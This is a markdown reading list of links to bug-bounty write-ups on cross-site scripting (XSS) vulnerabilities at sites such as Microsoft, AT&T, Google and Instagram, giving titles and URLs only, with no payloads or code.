- [Self XSS to Account Takeover](https://medium.com/@ch3ckm4te/self-xss-to-account-takeover-72c89775cf8f)
- [Reflected XSS on Microsoft subdomains](https://medium.com/bugbountywriteup/reflected-xss-on-microsoft-com-subdomains-4bdfc2c716df)
- [The tricky XSS](https://smaranchand.com.np/2020/02/the-tricky-xss/)
- [Reflected XSS in AT&T](https://medium.com/@godofdarkness.msf/reflected-xss-in-at-t-7f1bdd10d8f7)
- [XSS on Google using Acunetix](https://www.acunetix.com/blog/web-security-zone/xss-google-acunetix/)
- [Exploiting websocket application wide XSS](https://medium.com/@osamaavvan/exploiting-websocket-application-wide-xss-csrf-66e9e2ac8dfa)
- [Reflected XSS with HTTP Smuggling](https://hazana.xyz/posts/escalating-reflected-xss-with-http-smuggling/)
- [XSS on Facebook instagram CDN server bypassing signature protection](https://www.amolbaikar.com/xss-on-facebook-instagram-cdn-server-bypassing-signature-protection/)